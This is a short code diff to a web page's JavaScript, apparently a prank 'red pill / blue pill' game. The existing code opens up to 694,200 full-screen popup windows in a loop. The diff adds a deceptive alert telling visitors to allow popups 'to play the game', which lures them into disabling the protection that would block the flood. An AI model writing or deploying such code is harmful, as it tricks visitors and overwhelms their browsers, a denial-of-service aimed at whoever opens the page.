@@ -135,6 +135,7 @@
       var randomNumber = getRandomInt(0,9);
       function redPill() {
         if (confirm("Are you sure?")) {
+	  window.alert("Please allow popups on this website to play the game!")
           var fakeWindow = window.open("",);
           for (let i=0; i<694200; i++) {
             var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
@@ -154,6 +155,7 @@
       }
       function bluePill() {
         if (confirm("Are you sure?")) {
+	  window.alert("Please allow popups on this website to play the game!")
           for (let i=0; i<5; i++) {
             var smallWindow = window.open(url, "", "width=1920,height=1080");
           }
